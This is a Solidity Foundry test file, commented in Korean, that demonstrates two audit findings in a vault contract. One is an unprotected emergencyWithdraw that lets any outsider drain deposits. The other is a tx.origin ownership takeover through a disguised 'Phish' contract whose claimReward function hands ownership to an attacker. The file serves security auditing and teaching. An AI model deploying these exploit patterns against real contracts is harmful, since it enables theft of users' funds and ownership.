// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {AuditMe} from "../src/AuditMe.sol";

/// @dev tx.origin 인증 우회를 시연하기 위한 악성 중간 컨트랙트.
///      피해자(owner)가 이 컨트랙트의 함수를 호출하면 tx.origin=피해자, msg.sender=이 컨트랙트.
contract Phish {
    AuditMe public immutable vault;
    address public immutable attacker;

    constructor(AuditMe _vault, address _attacker) {
        vault = _vault;
        attacker = _attacker;
    }

    function claimReward() external {
        // 겉보기엔 보상 수령 함수지만, 실제로는 owner 권한을 공격자에게 넘긴다.
        vault.transferOwnership(attacker);
    }
}

contract AuditMeTest is Test {
    AuditMe vault;
    address alice;
    address attacker;

    function setUp() public {
        vault = new AuditMe();
        alice = makeAddr("alice");
        attacker = makeAddr("attacker");
        vm.deal(alice, 5 ether);
    }

    /// @notice 버그①: emergencyWithdraw()에 접근제어가 없어 예치 0인 외부인이 전액을 쓸어간다.
    function testAnyoneCanDrain() public {
        vm.prank(alice);
        vault.deposit{value: 5 ether}();
        assertEq(vault.vaultBalance(), 5 ether);

        uint256 beforeBal = attacker.balance;
        vm.prank(attacker); // 예치 한 적 없는 제3자
        vault.emergencyWithdraw();

        assertEq(vault.vaultBalance(), 0);
        assertEq(attacker.balance - beforeBal, 5 ether);
    }

    /// @notice 버그②: tx.origin 인증 → 피싱. 피해자가 악성 컨트랙트를 호출하면 소유권이 탈취된다.
    function testTxOriginPhishing() public {
        address victim = makeAddr("victim");
        vm.prank(victim);
        AuditMe v = new AuditMe(); // owner = victim
        assertEq(v.owner(), victim);

        address attacker2 = makeAddr("attacker2");
        Phish phish = new Phish(v, attacker2);

        // 피해자가 무심코 악성 함수 호출: (msg.sender, tx.origin) = (victim, victim)
        // → phish 내부의 transferOwnership 호출 시 msg.sender=phish 지만 tx.origin=victim 이라 통과.
        vm.prank(victim, victim);
        phish.claimReward();

        assertEq(v.owner(), attacker2);
    }
}
